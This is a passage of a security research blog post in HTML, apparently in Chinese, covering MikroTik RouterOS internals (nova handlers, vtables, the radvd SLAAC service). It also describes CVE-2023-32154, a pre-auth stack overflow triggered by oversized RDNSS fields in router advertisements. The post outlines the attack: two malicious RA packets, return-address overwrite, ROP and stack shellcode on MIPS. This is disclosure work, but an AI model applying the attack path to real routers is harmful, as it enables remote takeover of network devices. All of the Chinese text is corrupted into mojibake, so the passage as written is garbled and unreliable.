&lt;p&gt;ç¾åœ¨è®“æˆ‘å€‘å‡è¨­ï¼ŒLooper æ”¶åˆ°äº†ä¸€å€‹ç”± handler 1 è² è²¬çš„ nova messageï¼Œä¸¦åˆ†é…çµ¦ handler 1ï¼Œåœ¨æ”¶åˆ° message å¾Œï¼Œhandler 1 æœƒå»å‘¼å« Handler é¡åˆ¥ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::handleCmd&lt;/code&gt;ï¼Œé€™å€‹å‡½å¼æœƒæ ¹æ“š nova message ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_CMD&lt;/code&gt; åœ¨ vtable ä¸­å°‹æ‰¾å°æ‡‰çš„ function åŸ·è¡Œã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº†å¸¸è¦çš„åŠŸèƒ½ä¹‹å¤–ï¼Œvtable ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdUnknown&lt;/code&gt; å¸¸è¢«é–‹ç™¼è€… override ç”¨ä»¥æ“´å……åŠŸèƒ½ï¼Œä½†æœ‰æ™‚é–‹ç™¼è€…åè€Œæ˜¯ override &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleCmd&lt;/code&gt;ï¼Œçœ‹èµ·ä¾†æ˜¯å…¨ä¾ MikroTik é–‹ç™¼è€…çš„å¿ƒæƒ…è€Œå®šã€‚è€Œ Handler é¡åˆ¥å› ç‚ºæ˜¯åŸºç¤é¡åˆ¥ï¼Œæ‰€ä»¥ object ç›¸é—œçš„æŒ‡ä»¤ä¸¦æ²’æœ‰è¢«å¯¦ä½œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;è¡ç”Ÿé¡åˆ¥&quot;&gt;è¡ç”Ÿé¡åˆ¥&lt;/h3&gt;

&lt;p&gt;ç„¶è€Œ nova binary ä¸­ä½¿ç”¨æœ€å¤šçš„ä¸¦ä¸æ˜¯åŸºæœ¬çš„ Handler é¡åˆ¥ï¼Œè€Œæ˜¯å…¶è¡ç”Ÿé¡åˆ¥ã€‚ è¡ç”Ÿé¡åˆ¥å¯ä»¥ç”¨ä¾†å„²å­˜å¤šå€‹å–®ä¸€å‹åˆ¥ç‰©ä»¶ï¼Œé¡ä¼¼ C++ çš„ STL å®¹å™¨ã€‚&lt;/p&gt;

&lt;p&gt;èˆ‰ä¾‹ä¾†èªªï¼Œç•¶ä½¿ç”¨è€…é€é web panel çš„ç®¡ç†ä»‹é¢å»ºç«‹ä¸€å€‹ DHCP server çš„æ™‚å€™ï¼Œæœƒé€å‡ºä¸€å€‹æŒ‡ä»¤ç‚ºã€Œadd objectã€çš„ nova message åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process çš„ handler 0ï¼Œæ¥ä¸‹ä¾† handler 0 æœƒç”¢ç”Ÿä¸€å€‹ dhcp server ç‰©ä»¶è¨˜éŒ„ç›¸é—œè¨­å®šï¼Œä¸¦ä¸”è©²ç‰©ä»¶æœƒè¢«ä¿å­˜åœ¨ handler 0 å…§éƒ¨çš„ä¸€å€‹ tree ç•¶ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™è£¡çš„ handler 0 å°±æ˜¯ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; çš„ instanceï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; å³æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handler&lt;/code&gt; çš„ä¸€å€‹è¡ç”Ÿé¡åˆ¥ã€‚ ä¸”ç”±æ–¼æŒ‡ä»¤æ˜¯ã€Œadd objectã€ï¼Œæ‰€ä»¥è§¸ç™¼äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap::cmdAddObj&lt;/code&gt; é€™å€‹æˆå“¡å‡½å¼ï¼Œé€™å€‹æˆå“¡å‡½å¼æœƒå»å‘¼å« handler 0 çš„ vtable ä¸­ä½æ–¼ offset 0x7c ä½ç½®æ‰€æŒ‡å‘çš„ä¸€å€‹ functionï¼Œé€™å€‹ function å¯¦éš›ä¸Šå°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; ä¸­åŒ…å«çš„ç‰©ä»¶çš„å»ºæ§‹å¼ï¼Œä¾‹å¦‚ï¼Œè‹¥é–‹ç™¼è€…åœ¨å®£å‘Š handler 0 æ™‚ï¼Œå…¶é¡å‹ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&amp;lt;string&amp;gt;&lt;/code&gt; ï¼Œå‰‡ offset 0x7c çš„ä½ç½®æ‰€æŒ‡å‘çš„ function å°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt; çš„å»ºæ§‹å¼ã€‚&lt;/p&gt;

&lt;p&gt;æ¯å€‹è¡ç”Ÿé¡åˆ¥å„²å­˜å…§éƒ¨ç‰©ä»¶å»ºæ§‹å¼çš„ function åœ¨ vtable ä¸Šçš„ offset éƒ½ä¸ç›¸åŒï¼Œæƒ³è¦æ‰¾åˆ°è¡ç”Ÿé¡åˆ¥ä¸­ç‰©ä»¶çš„å»ºæ§‹å­ï¼Œå¯ä»¥é€éé€†å‘å®ƒå€‘å€‹åˆ¥çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; ä¾†æ‰¾åˆ°ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ipcå’Œ-ipc-ä»¥å¤–çš„&quot;&gt;IPCï¼Œå’Œ IPC ä»¥å¤–çš„&lt;/h3&gt;

&lt;p&gt;å„˜ç®¡ IPC ä¼¼ä¹ç„¡è™•ä¸åœ¨ï¼Œä½†å…¶å¯¦ RouterOS ä¸­æœ‰è¨±å¤šåŠŸèƒ½ä¸¦ä¸ä»¥ IPC å¯¦ç¾ã€‚ä»¥å¯¦ä½œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; ç¨‹å¼ä¸­çš„å…©å€‹ layer 2 çš„ç™¼ç¾å”è­°ï¼šCDPã€LLDP ç‚ºä¾‹ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;åœ¨é–‹å•Ÿé€™å…©å€‹æœå‹™æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; ä¸­çš„ handler 0 æœƒè² è²¬å»å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::createPacketReceiver&lt;/code&gt; ä¾†é–‹å•Ÿ CDP åŠ LLDP ä½¿ç”¨çš„ socket ä¸¦ä¸”è¨»å†Šåˆ†åˆ¥å°æ‡‰çš„ callback function&lt;/li&gt;
  &lt;li&gt;åœ¨ Looper çš„æ¯æ¬¡è¿­ä»£ä¸­ï¼Œç¨‹å¼æœƒé€é poll ä¾†æª¢æŸ¥ CDP åŠ LLDP socket æ˜¯å¦æœ‰æ”¶åˆ°å°åŒ…&lt;/li&gt;
  &lt;li&gt;å¦‚æœç™¼ç¾æœ‰æ”¶åˆ°å°åŒ…å°±æœƒå‘¼å«å°æ‡‰çš„ callback function å»é€²è¡Œè™•ç†&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CDP çš„ callback åšçš„äº‹æƒ…ä¹Ÿéå¸¸ç°¡å–®ï¼šç¢ºå®šæ”¶åˆ°å°åŒ…çš„ interface æ˜¯å…è¨±å­˜å–çš„ï¼Œå¦‚æœæ­£ç¢ºï¼Œå°±è§£æå°åŒ…ä¸¦ç›´æ¥æŠŠè³‡è¨Šç›´æ¥å­˜å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ASecMap&lt;/code&gt; æ¥è‘—å°±ç›´æ¥çµæŸï¼Œéç¨‹ä¸­ä¸¦ä¸ä½¿ç”¨ nova messageã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨æ­¤é¡æƒ…å¢ƒä¸­ï¼ŒIPC é™¤äº†ç”¨ä¾†é–‹å•Ÿ CDP æˆ– LLDP æœå‹™ä¹‹å¤–ï¼ˆé è¨­é–‹å•Ÿï¼‰ï¼Œå®Œå…¨ç„¡æ³•è§¸ç™¼ CDP æˆ–æ˜¯ LLDP çš„ä»»ä½•åŠŸèƒ½ï¼Œå› æ­¤ä»¥å¾€å°ˆæ³¨æ–¼ IPC çš„ç ”ç©¶å°±å¾ˆæœ‰å¯èƒ½æ²’æœ‰æª¢æ¸¬åˆ°é€™ç¨®å¯¦ä½œæ–¹å¼çš„ç¨‹å¼é‚è¼¯ã€‚&lt;/p&gt;

&lt;h2 id=&quot;pre-auth-rce-çš„æ•…äº‹&quot;&gt;Pre-Auth RCE çš„æ•…äº‹&lt;/h2&gt;

&lt;p&gt;å°æ–¼ RouterOS çš„ç†è§£ï¼Œä¹Ÿä¼´éš¨è‘—ä¸€æ¬¡é©šå–œçš„æ„å¤–å¸¶é ˜æˆ‘å€‘æ‰¾åˆ°æ·±è—å·²ä¹…çš„æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;è³½å‰æŸä¸€å¤©ï¼Œæˆ‘å€‘ç…§å¸¸ç‚ºäº†åœ¨ RouterOS ä¸Šé€²è¡Œé€†å‘åŠé™¤éŒ¯è€Œæ’æ‹”ç¶²è·¯ç·šæ™‚ï¼Œç™¼ç¾ log file ç´€éŒ„åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; é€™éš»ç¨‹å¼å·²ç¶“ crash äº†å¥½å¹¾æ¬¡ï¼æ‰€ä»¥æˆ‘å€‘å˜—è©¦æ’æ‹”ç¶²è·¯ç·šä¾†æ‰‹å‹•å¾©ç¾ crash çš„ç™¼ç”Ÿï¼Œæ­é… debugger ä½¿ç”¨å°±èƒ½å®šä½åˆ°å‡ºå•é¡Œçš„åœ°æ–¹ï¼Œä½†ç¶“éäº†ä¸Šåƒæ¬¡çš„æ’æ‹”ï¼Œæˆ‘å€‘é‚„æ˜¯ç„¡æ³•ç¢ºå®š crash ç”¢ç”Ÿçš„æ¢ä»¶ï¼Œåªèƒ½ä»»æ†‘ crash éš¨æ©Ÿçš„ç™¼ç”Ÿã€‚&lt;/p&gt;

&lt;p&gt;ç¶“éä¸€æ®µæ™‚é–“çš„æ™æ‰å¾Œï¼Œæˆ‘å€‘åœæ­¢é€éé€™ç¨®ç›²ç›®çš„å˜—è©¦ä¾†å®šä½æ¼æ´ï¼Œè½‰è€Œåˆ©ç”¨éœæ…‹é€†å‘åˆ†æ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¾†å°‹æ‰¾ crash ç”¢ç”Ÿçš„ä½ç½®ï¼Œé›–ç„¶æœ€å¾Œä¾èˆŠæ²’æ‰¾åˆ°é€ æˆ crash çš„æ ¹å› ï¼Œä½†å—ç›Šæ–¼æˆ‘å€‘å°æ–¼ nova binary çš„ç†è§£ï¼Œæˆ‘å€‘åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¸­æ‰¾åˆ°äº†å¦å¤–ä¸€å€‹å¯ä»¥åˆ©ç”¨çš„æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ä»‹ç´¹é€™å€‹æ¼æ´ä¹‹å‰ï¼Œå¿…é ˆå¾—å…ˆä»‹ç´¹ä¸€ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;  process ç©¶ç«Ÿæ˜¯è² è²¬ä»€éº¼åŠŸèƒ½çš„ç¨‹å¼ã€‚&lt;/p&gt;

&lt;h3 id=&quot;slaac-stateless-address-auto-configuration-&quot;&gt;SLAAC (Stateless Address Auto-Configuration )&lt;/h3&gt;

&lt;p&gt;ä¸€è¨€ä»¥è”½ä¹‹ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; æ˜¯ä¸€å€‹è² è²¬è™•ç† IPv6 çš„ SLAAC çš„æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ SLAAC ç’°å¢ƒä¸­ï¼Œå‡è¨­ä¸€å°é›»è…¦æƒ³è¦å–å¾—ä¸€å€‹ IPv6 çš„åœ°å€ä¸Šç¶²ï¼Œä»–é¦–å…ˆæœƒå‘æ‰€æœ‰ router å»£æ’­ä¸€å€‹ RSï¼ˆRouter Solicitationï¼‰çš„è«‹æ±‚ã€‚ åœ¨ Router æ”¶åˆ° RS ä¹‹å¾Œï¼Œå°±æœƒé€é RAï¼ˆRouter Advertisementï¼‰å°‡ network prefix å»£æ’­å‡ºå»ï¼›æ”¶åˆ° RA çš„é›»è…¦ä¾¿å¯ä»¥æ‹¿ network prefix ä»¥åŠ EUI-64 ä¾†è‡ªè¡Œæ±ºå®šè‡ªå·±ç”¨ä¾†é€£ç¶²çš„ IPv6 ç‚ºä½•ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è‹¥ ISP æˆ–æ˜¯ç¶²ç®¡ï¼Œæƒ³æŠŠä¸€å€‹ç¶²æ®µåˆ†é…çµ¦ç”¨æˆ¶ï¼Œè®“ç”¨æˆ¶å¯è‡ªè¡Œåˆ†é…åœ°å€çµ¦ç”¨æˆ¶ç®¡ç†çš„æ©Ÿå™¨ï¼Œåœ¨åªä½¿ç”¨ SLAAC è€Œä¸è¼”ä»¥ DHCP æ™‚ï¼Œå¦‚ä½•åˆ†é…ä¸€å€‹ç¶²æ®µçµ¦ä½¿ç”¨è€…ï¼Ÿå› ç‚º SLAAC ä¸¦æ²’æœ‰è¾¦æ³•ç›´æ¥å§”æ´¾ï¼Œæ‰€ä»¥é€šå¸¸æœƒæ˜¯é€™éº¼é‹ä½œçš„ï¼š&lt;/p&gt;

&lt;p&gt;å‡è¨­æœ‰ä¸€å€‹ upstream routerï¼šRouter Aï¼Œå®ƒå±¬æ–¼ ISP æˆ–ç¶²ç®¡ã€é‚„æœ‰ä¸€å°ç”¨æˆ¶è‡ªè¡Œç®¡ç†çš„ Router Bã€ä¸€å°ç”¨æˆ¶ç®¡ç†çš„é›»è…¦ã€‚ISP æˆ–ç¶²ç®¡æœƒé å…ˆé€é email é€šçŸ¥ç”¨æˆ¶ä¸€å€‹åˆ†é…çµ¦ç”¨æˆ¶ä½¿ç”¨çš„ /48 network preifxï¼Œé€™è£¡å‡è¨­æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2001:db8::/48&lt;/code&gt;ã€‚ç”¨æˆ¶å¯ä»¥å°‡ä¹‹è¨­å®šåœ¨ Router B ä¸Šï¼Œå‰‡ç•¶é›»è…¦å‘ Router B ç™¼é€ RS æ™‚ï¼ŒRouter B å°±æœƒæŠŠé€™å€‹ prefix æ”¾å…¥ RA ä¸­å›å‚³ï¼Œè€Œé€™å€‹ prefix ç¨±ä½œ routed prefixã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åŒæ™‚ç‚ºäº†è®“ä½¿ç”¨è€…çš„ Router B æœ‰è¾¦æ³•èˆ‡ Router A æºé€šï¼Œå®ƒä¹Ÿéœ€è¦ä¸€å€‹è‡ªå·±çš„ IPv6 åœ°å€ï¼Œé€™æ™‚ Router B å¾ Router A æ‹¿åˆ°çš„ network prefix å°±ç¨±ä½œ link prefixã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;radvd-çš„åŸ·è¡Œæµç¨‹&quot;&gt;radvd çš„åŸ·è¡Œæµç¨‹&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process è¢«å•Ÿå‹•æ™‚ï¼Œæœƒé€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ThinRunner::addSocket&lt;/code&gt; ä¾†é–‹å•Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä½¿ç”¨çš„ socket ä¸¦ä¸”è¨»å†Šå°æ‡‰çš„ callback function
&lt;img src=&quot;/assets/img/blog/20240524/29.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Looper&lt;/code&gt; çš„æ¯æ¬¡è¿­ä»£ä¸­æœƒé€é poll æª¢æŸ¥ socket æ˜¯å¦æœ‰æ”¶åˆ°å°åŒ…
&lt;img src=&quot;/assets/img/blog/20240524/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;å¦‚æœç™¼ç¾æœ‰æ”¶åˆ°å°åŒ…å°±æœƒå‘¼å«å°æ‡‰çš„ callback function å»é€²è¡Œè™•ç†
&lt;img src=&quot;/assets/img/blog/20240524/31.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; çš„ callback ä¸­ï¼Œå®ƒé¦–å…ˆæª¢æŸ¥å°åŒ…æ˜¯å¦æ˜¯åˆæ³•çš„ RA æˆ– RSï¼Œæ˜¯ RA å°±æŠŠè³‡è¨Šå­˜èµ·ä¾†ï¼›æ˜¯ RS å°±é–‹å§‹å¾€ LAN å»£æ’­ RAã€‚&lt;/p&gt;

&lt;p&gt;è€Œç¸½å…±æœ‰ä¸‰ç¨®æƒ…æ³ RouterOS æœƒå¾€ LAN å»£æ’­ prefixï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;å¾ LAN æ”¶åˆ° RS å°åŒ…&lt;/li&gt;
  &lt;li&gt;å¾ WAN æ”¶åˆ° RA å°åŒ…&lt;/li&gt;
  &lt;li&gt;å®šæ™‚åœ¨ LAN å»£æ’­ RA å°åŒ…ï¼ˆé è¨­éš¨æ©Ÿåœ¨ 200~600 ç§’ä¹‹å¾Œå»£æ’­ä¸€æ¬¡ï¼‰&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸éåœ¨ callback ä¸­æˆ‘å€‘æ²’æœ‰é¦¬ä¸Šé€ééœæ…‹åˆ†ææ‰¾åˆ° case 2 ç™¼é€ RA çš„åœ°æ–¹ï¼Œç•¶æ™‚æˆ‘å€‘é‚„ä¸ç¢ºå®šå…·é«”åŸå› ã€‚å¾Œä¾†ç™¼ç¾é€™éƒ¨åˆ†çš„è¡Œç‚ºèˆ‡ RouterOS IPC ä¸­çš„è¨‚é–±æ©Ÿåˆ¶æœ‰é—œï¼Œæˆ‘å€‘å°‡æœƒåœ¨å¾Œé¢çš„ç« ç¯€é€²è¡Œè§£é‡‹ï¼Œé€™åŒæ™‚ä¹Ÿèˆ‡æˆ‘å€‘ç™¼ç¾çš„ race condition ç›¸é—œã€‚ä¸éå¦å¤–å…©å€‹æƒ…æ³æˆ‘å€‘åˆ°æ˜¯å¯ä»¥ç›´æ¥é€ééœæ…‹åˆ†ææ‰¾åˆ°ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ case 1 ä¸­ï¼Œç•¶å¾ LAN æ”¶åˆ° RS æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; æœƒå‘¼å« sendRA ä¾†å»£æ’­ RA å°åŒ…ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ case 2 ä¸­ï¼Œhandler 1 åœ¨åˆå§‹åŒ–å¾Œä¾¿æœƒå»è¨»å†Šä¸€å€‹ timerï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt;ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RAroutine&lt;/code&gt; è¢«ç”¨ä¾†åœ¨æ¯éš”ä¸€æ®µæ™‚é–“å»å‘¼å« sendRA ä¾†å»£æ’­å°åŒ…ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2023-32154&quot;&gt;CVE-2023-32154&lt;/h2&gt;

&lt;p&gt;å¯ä»¥ç™¼ç¾å…±åŒçš„å‡½å¼å°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt;ï¼Œåœ¨æ·±å…¥åˆ†æ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; ä¹‹å¾Œï¼Œæˆ‘å€‘ç™¼ç¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; åœ¨è™•ç† DNS advisory çš„åœ°æ–¹å­˜åœ¨å¼±é»ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; æœƒå°‡ upstream æ”¶åˆ°çš„ RA ä¸­çš„ DNS advisory å„²å­˜èµ·ä¾†ï¼ˆä½¿ç”¨ tree ä½œç‚ºè³‡æ–™çµæ§‹ï¼‰ï¼Œç•¶ router è¦å¾€ LAN å»£æ’­ RA æ™‚ï¼Œé€™äº› DNS ä¹Ÿæœƒè¢«åŒ…é€² RA ä¸­ä¸€èµ·è¢«å»£æ’­çµ¦ LAN çš„æ©Ÿå™¨ã€‚åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ä¸­ï¼Œæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; é€™å€‹ function å°‡æ¨¹ç‹€çµæ§‹çš„ DNS å±•é–‹å¾Œæ”¾é€² ICMPv6 çš„å°åŒ…ç•¶ä¸­ã€‚ç”¨ä¾†å‚³éçµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; çš„ç¬¬ä¸€å€‹åƒæ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RA_raw&lt;/code&gt; æ˜¯ä¸€å€‹ 4096 bytes çš„ bufferï¼Œä¹Ÿå°±æ˜¯æœ€çµ‚è¢«é€å‡ºçš„ ICMPv6ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è·Ÿé€² &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; å¾Œæˆ‘å€‘é¦¬ä¸Šå¯ä»¥ç™¼ç¾é€™è£¡å¯èƒ½å­˜åœ¨ä¸€å€‹ stack buffer overflow çš„å¼±é»ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; æŠŠ DNS æ”¾é€² ICMPv6 å°åŒ…ä¸­è€Œä¸”æ²’æœ‰ä»»ä½• boundary checkï¼Œåªè¦ DNS advisory çµ¦çš„å¤ å¤šå°±å¯ä»¥è§¸ç™¼ stack buffer overflowã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™è£¡ä½¿ç”¨çš„ DNS ä¾†è‡ªæ–¼ RA å°åŒ…ä¸­çš„ RDNSS æ¬„ä½ï¼Œä½†æ ¹æ“š RFC å¯ä»¥ç™¼ç¾ï¼Œç”¨ä¾†æè¿° RDNSS é•·åº¦çš„æ¬„ä½åªæœ‰ 8-bitï¼Œæ‰€ä»¥æœ€å¤šåƒ…èƒ½è¦†è“‹ 255*16 bytesï¼Œé€™å€‹é•·åº¦ä¸¦ç„¡æ³•ä½¿æˆ‘å€‘è¦†å¯«åˆ° return addressã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†å¦‚æœé€™ä¸æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ç¬¬ä¸€æ¬¡æ”¶åˆ° RAï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; å°±éœ€è¦åœ¨æ¥ä¸‹ä¾†çš„å°åŒ…ä¸­å°‡èˆŠçš„ DNS æ¨™ç‚º expiredï¼Œæ‰€ä»¥å¯¦éš›ä¸Šæˆ‘å€‘å¯ä»¥è¦†è“‹å…©å€çš„é•·åº¦ï¼Œä¹Ÿå°±æ˜¯ 255*16*2 bytesï¼Œé€™å°±è¶³ä»¥è®“æˆ‘å€‘è¦†è“‹åˆ° return address äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ”»æ“Šæµç¨‹&quot;&gt;æ”»æ“Šæµç¨‹&lt;/h2&gt;

&lt;p&gt;æœ‰äº†ä¸Šè¿°çš„å¼±é»ï¼Œæˆ‘å€‘åªè¦é€éå¾€ç›®æ¨™ RouterOS é€å…©å€‹ RDNSS æ¬„ä½é•·åº¦ç‚º 255 çš„æƒ¡æ„ RA å°åŒ…ï¼Œå°±å¯ä»¥åˆ©ç”¨ RDNSS ä¸­çš„ IPv6 åœ°å€ä¾†æ§åˆ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ç¨‹å¼çš„åŸ·è¡Œæµç¨‹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ä¿è­·&quot;&gt;ä¿è­·&lt;/h3&gt;

&lt;p&gt;ç”±æ–¼ RouterOS ä½¿ç”¨ MIPS çš„æ¶æ§‹ï¼Œæ‰€ä»¥ CPU ä¸¦ä¸æ”¯æ´ NX ï¼Œä½†é™¤æ­¤ä¹‹å¤–çš„ä¿è­·ä¹Ÿæ²’æœ‰è¢«é–‹å•Ÿã€‚
æ‰€ä»¥åªè¦æ‰¾åˆ°å¥½ç”¨çš„ ROP gadget è®“åŸ·è¡Œæµç¨‹æœ€çµ‚ jump åˆ°æˆ‘å€‘æ”¾åœ¨ stack ä¸Šçš„ shellcode å°±è¡Œäº†ï¼Œè½èµ·ä¾†æ¥µåº¦ç°¡å–®ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;shellcode-é™åˆ¶&quot;&gt;shellcode é™åˆ¶&lt;/h3&gt;

&lt;p&gt;ä½†æ˜¯åœ¨æ§‹é€  exploit çš„éç¨‹ä¸­å…¶å¯¦å­˜åœ¨ä¸å°‘é™åˆ¶ï¼Œä¾‹å¦‚ï¼Œå› ç‚º IPv6 åœ°å€è¢«å„²å­˜åœ¨ tree çµæ§‹ä¸­ï¼Œæ‰€ä»¥æœƒåœ¨æ’åºå¾Œæ‰æ”¾ä¸Š stackï¼Œå› æ­¤æˆ‘å€‘å¿…é ˆä¿è­‰æˆ‘å€‘å»ºæ§‹çš„ payload åœ¨ç¶“éæ’åºä¹‹å¾Œé‚„æœƒæ˜¯æˆ‘å€‘ä¸€é–‹å§‹æ§‹é€ çš„ shellcodeã€‚&lt;/p&gt;

